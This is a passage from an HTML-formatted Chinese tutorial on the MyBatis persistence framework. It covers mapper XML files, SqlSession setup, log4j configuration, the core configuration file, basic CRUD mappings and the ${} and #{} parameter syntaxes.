class="comment">            2、mapper接口中的方法的方法名要和映射文件中的sqL的id保持一致--&gt;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">&lt;!--int insertUser();--&gt;</span>    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUser&quot;</span>&gt;</span>  </span><br><span class="line">        insert into t_user values(&#x27;1&#x27;,&#x27;admin&#x27;,&#x27;123456&#x27;,23,&#x27;男&#x27;,&#x27;12345@qq.com&#x27;)  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-6、通过junit测试功能"><a href="#2-6、通过junit测试功能" class="headerlink" title="2.6、通过junit测试功能"></a>2.6、通过junit测试功能</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取MyBatis的核心配置文件</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Resources.getResourceAsStream(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line"><span class="comment">//创建SqlSessionFactoryBuilder对象</span></span><br><span class="line"><span class="type">SqlSessionFactoryBuilder</span> <span class="variable">sqlSessionFactoryBuilder</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line"><span class="title class_">SqlSessionFactoryBuilder</span>();</span><br><span class="line"><span class="comment">//通过核心配置文件所对应的字节输入流创建工厂类SqlSessionFactory，生产SqlSession对象</span></span><br><span class="line"><span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> sqlSessionFactoryBuilder.build(is);</span><br><span class="line"><span class="comment">//创建SqlSession对象，此时通过SqlSession对象所操作的sql都必须手动提交或回滚事务</span></span><br><span class="line"><span class="comment">//SqlSession sqlSession = sqlSessionFactory.openSession();</span></span><br><span class="line"><span class="comment">//创建SqlSession对象，此时通过SqlSession对象所操作的sql都会自动提交</span></span><br><span class="line"><span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//通过代理模式创建UserMapper接口的代理实现类对象</span></span><br><span class="line"><span class="type">UserMapper</span> <span class="variable">userMapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line"><span class="comment">//调用UserMapper接口中的方法，就可以根据UserMapper的全类名匹配元素文件，通过调用的方法名匹配</span></span><br><span class="line">映射文件中的SQL标签，并执行标签中的SQL语句</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> userMapper.insertUser();</span><br><span class="line"><span class="comment">//sqlSession.commit();</span></span><br><span class="line">System.out.println(<span class="string">&quot;结果：&quot;</span>+result);</span><br></pre></td></tr></table></figure><blockquote><ul><li><p>SqlSession：代表Java程序和<strong>数据库</strong>之间的<strong>会话</strong>。（HttpSession是Java程序和浏览器之间的会话）</p></li><li><p>SqlSessionFactory：是“生产”SqlSession的“工厂”。</p></li><li><p>工厂模式：如果创建某一个对象，使用的过程基本固定，那么我们就可以把创建这个对象的</p></li></ul><p>相关代码封装到一个“工厂类”中，以后都使用这个工厂类来“生产”我们需要的对象。</p></blockquote><h2 id="2-7、加入log4j日志功能"><a href="#2-7、加入log4j日志功能" class="headerlink" title="2.7、加入log4j日志功能"></a>2.7、加入log4j日志功能</h2><h3 id="①加入依赖"><a href="#①加入依赖" class="headerlink" title="①加入依赖"></a>①加入依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- log4j日志 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="②加入log4j的配置文件"><a href="#②加入log4j的配置文件" class="headerlink" title="②加入log4j的配置文件"></a>②加入log4j的配置文件</h3><blockquote><p>log4j的配置文件名为log4j.xml，存放的位置是src&#x2F;main&#x2F;resources目录下</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">log4j</span>:configuration <span class="keyword">SYSTEM</span> <span class="string">&quot;log4j.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">log4j:configuration</span> <span class="attr">xmlns:log4j</span>=<span class="string">&quot;http://jakarta.apache.org/log4j/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.log4j.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Encoding&quot;</span> <span class="attr">value</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">layout</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.log4j.PatternLayout&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;ConversionPattern&quot;</span> <span class="attr">value</span>=<span class="string">&quot;%-5p %d&#123;MM-dd HH:mm:ss,SSS&#125;%m (%F:%L) \n&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">layout</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;java.sql&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">&quot;debug&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;org.apache.ibatis&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">&quot;info&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">logger</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">level</span> <span class="attr">value</span>=<span class="string">&quot;debug&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">log4j:configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>日志的级别</strong></p><p>FATAL(致命)&gt;ERROR(错误)&gt;WARN(警告)&gt;INFO(信息)&gt;DEBUG(调试)</p><p>从左到右打印的内容越来越详细</p></blockquote><h1 id="3、核心配置文件详解"><a href="#3、核心配置文件详解" class="headerlink" title="3、核心配置文件详解"></a>3、核心配置文件详解</h1><blockquote><p>核心配置文件中的标签必须按照固定的顺序：</p><p>properties?,settings?,typeAliases?,typeHandlers?,objectFactory?,objectWrapperFactory?,refl</p><p>ectorFactory?,plugins?,environments?,databaseIdProvider?,mappers?</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">            MyBatis核心配置文件中，标签的顺序：</span></span><br><span class="line"><span class="comment">            properties?,settings?,typeAliases?,typeHandlers?,</span></span><br><span class="line"><span class="comment">            objectFactory?,objectWrapperFactory?,reflectorFactory?,</span></span><br><span class="line"><span class="comment">            plugins?,environments?,databaseIdProvider?,mappers?</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入properties文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;jdbc.properties&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置类型别名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">typeAlias：设置某个类型的别名</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">type：设置需要设置别名的类型</span></span><br><span class="line"><span class="comment">alias：设置某个类型的别名，若不设置该属性，那么该类型拥有默认的别名，即类名且不区分大小写</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;typeAlias type=&quot;com.atguigu.mybatis.pojo.User&quot;&gt;&lt;/typeAlias&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--以包为单位，将包下所有的类型设置默认的类型别名，即类名且不区分大小写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.atguigu.mybatis.pojo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">environments：配置多个连接数据库的环境</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">default：设置默认使用的环境的id</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   environment：配置某个具体的环境</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">id：表示连接数据库的环境的唯一标识，不能重复</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">transactionManager：设置事务管理方式</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">type=&quot;JDBC|MANAGED&quot;</span></span><br><span class="line"><span class="comment">JDBC：表示当前环境中，执行SQL时，使用的是JDBC中原生的事务管理方式，事务的提交或回滚需要手动处理</span></span><br><span class="line"><span class="comment">MANAGED：被管理，例如Spring</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">dataSource：配置数据源</span></span><br><span class="line"><span class="comment">属性：</span></span><br><span class="line"><span class="comment">                 type：设置数据源的类型</span></span><br><span class="line"><span class="comment">                 type=&quot;POOLED|UNPOOLED|JNDI&quot;</span></span><br><span class="line"><span class="comment">                    POOLED：表示使用数据库连接池缓存数据库连接</span></span><br><span class="line"><span class="comment">                    UNPOOLED：表示不使用数据库连接池</span></span><br><span class="line"><span class="comment">                    JNDI：表示使用上下文中的数据源</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                 <span class="comment">&lt;!--设置连接数据库的驱动--&gt;</span></span><br><span class="line">                 <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--设置连接数据库的连接地址--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--设置连接数据库的用户名--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--设置连接数据库的密码--&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">             <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span><span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/ssmserverTimezone=UTC&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入映射文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--&lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt;--&gt;</span></span><br><span class="line"> <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">         以包为单位引入映射文件</span></span><br><span class="line"><span class="comment">            要求：</span></span><br><span class="line"><span class="comment">            1、mapper接口所在的包要和映射文件所在的包一致</span></span><br><span class="line"><span class="comment">            2、mapper接口要和映射文件的名字一致</span></span><br><span class="line"><span class="comment">   --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.atguigu.mybatis.mapper&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote><h1 id="4、MyBatis的增删改查"><a href="#4、MyBatis的增删改查" class="headerlink" title="4、MyBatis的增删改查"></a>4、MyBatis的增删改查</h1><h2 id="4-1、新增"><a href="#4-1、新增" class="headerlink" title="4.1、新增"></a>4.1、新增</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int insertUser();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertUser&quot;</span>&gt;</span></span><br><span class="line">insert into t_user values(null,&#x27;admin&#x27;,&#x27;123456&#x27;,23,&#x27;男&#x27;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-2、删除"><a href="#4-2、删除" class="headerlink" title="4.2、删除"></a>4.2、删除</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int deleteUser();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteUser&quot;</span>&gt;</span></span><br><span class="line">delete from t_user where id = 7</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-3、修改"><a href="#4-3、修改" class="headerlink" title="4.3、修改"></a>4.3、修改</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--int updateUser();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateUser&quot;</span>&gt;</span></span><br><span class="line">update t_user set username=&#x27;ybc&#x27;,password=&#x27;123&#x27; where id = 6</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-4、查询一个实体类对象"><a href="#4-4、查询一个实体类对象" class="headerlink" title="4.4、查询一个实体类对象"></a>4.4、查询一个实体类对象</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--User getUserById();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.atguigu.mybatis.bean.User&quot;</span>&gt;</span></span><br><span class="line">select * from t_user where id = 2</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-5、查询list集合"><a href="#4-5、查询list集合" class="headerlink" title="4.5、查询list集合"></a>4.5、查询list集合</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;User&gt; getUserList();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.atguigu.mybatis.bean.User&quot;</span>&gt;</span></span><br><span class="line">select * from t_user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：</p><p>1、查询的标签select必须设置属性resultType或resultMap，用于设置实体类和数据库表的映射</p><p>关系</p><p>resultType：自动映射，用于属性名和表中字段名一致的情况</p><p>resultMap：自定义映射，用于一对多或多对一或字段名和属性名不一致的情况</p></blockquote><h1 id="5、MyBatis获取参数值的两种方式"><a href="#5、MyBatis获取参数值的两种方式" class="headerlink" title="5、MyBatis获取参数值的两种方式"></a>5、MyBatis获取参数值的两种方式</h1><blockquote><p>MyBatis获取参数值的两种方式：**${}<strong>和</strong>#{}**</p><p>${}的本质就是字符串拼接，#{}的本质就是占位符赋值</p><p>${}使用字符串拼接的方式拼接sql，若为字符串类型或日期类型的字段进行赋值时，需要手动加单引</p><p>号；但是#{}使用占位符赋值的方式拼接sql，此时为字符串类型或日期类型的字段进行赋值时，</p><p>可以自动添加单引号</p></blockquote><h2 id="5-1、单个字面量类型的参数"><a href="#5-1、单个字面量类型的参数" class="headerlink" title="5.1、单个字面量类型的参数"></a>5.1、单个字面量类型的参数</h2><blockquote><p>若mapper接口中的方法参数为单个的字面量类型</p><p>此时可以使用${}和#{}以任意的名称获取参数的值，注意${}需要手动加单引号</p></blockquote><h2 id="5-2、多个字面量类型的参数"><a href="#5-2、多个字面量类型的参数" class="headerlink" title="5.2、多个字面量类型的参数"></a>5.2、多个字面量类型的参数</h2><blockquote><p>若mapper接口中的方法参数为多个时</p><p>此时MyBatis会自动将这些参数放在一个map集合中，以arg0,arg1…为键，以参数为值；以</p><p>param1,param2…为键，以参数为值；因此只需要通过${}和#{}访问map集合的键就可以获取相</p><p>对应的值，注意${}需要手动加单引号</p></blockquote><h2 id="5-3、map集合类型的参数"><a href="#5-3、map集合类型的参数" class="headerlink" title="5.3、map集合类型的参数"></a>5.3、map集合类型的参数</h2><blockquote><p>若mapper接口中的方法需要的参数为多个时，此时可以手动创建map集合，将这些数据放在</p><p>map中</p><p>只需要通过${}和#{}访问map集合的键就可以获取相对应的值，注意${}需要手动加单引号</p></blockquote><h2 id="5-4、实体类类型的参数"><a href="#5-4、实体类类型的参数" class="headerlink" title="5.4、实体类类型的参数"></a>5.4、实体类类型的参数</h2><blockquote><p>若mapper接口中的方法参数为实体类对象时</p><p>此时可以使用${}和#{}，通过访问实体类对象中的属性名获取属性值，注意${}需要手动加单引号</p></blockquote><h2 id="5-5、使用-Param标识参数"><a href="#5-5、使用-Param标识参数" class="headerlink" title="5.5、使用@Param标识参数"></a>5.5、使用@Param标识参数</h2><blockquote><p>可以通过@Param注解标识mapper接口中的方法参数</p><p>此时，会将这些参数放在map集合中，以@Param注解的value属性值为键，以参数为值；以</p><p>param1,param2…为键，以参数为值；只需要通过${}和#{}访问map集合的键就可以获取相对应</p><p>的值，</p><p>注意${}需要手动加单引号</p></blockquote><h1 id="6、MyBatis的各种查询功能"><a href="#6、MyBatis的各种查询功能" class="headerlink" title="6、MyBatis的各种查询功能"></a>6、MyBatis的各种查询功能</h1><h2 id="6-1、查询一个实体类对象"><a href="#6-1、查询一个实体类对象" class="headerlink" title="6.1、查询一个实体类对象"></a>6.1、查询一个实体类对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 根据用户id查询用户信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">User <span class="title function_">getUserById</span><span class="params">(<span class="meta">@Param(&quot;id&quot;)</span> <span class="type">int</span> id)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--User getUserById(@Param(&quot;id&quot;) int id);--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserById&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from t_user where id = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="6-2、查询一个list集合"><a href="#6-2、查询一个list集合" class="headerlink" title="6.2、查询一个list集合"></a>6.2、查询一个list集合</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 查询所有用户信息</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">List&lt;User&gt; <span class="title function_">getUserList</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--List&lt;User&gt; getUserList();--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">select * from t_user</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>当查询的数据为多条时，不能使用实体类作为返回值，否则会抛出异常</p><p>TooManyResultsException；但是若查询的数据只有一条，可以使用实体类或集合作为返回值</p></blockquote><h2 id="6-3、查询单个数据"><a href="#6-3、查询单个数据" class="headerlink" title="6.3、查询单个数据"></a>6.3、查询单个数据</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 查询用户的总记录数</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">* 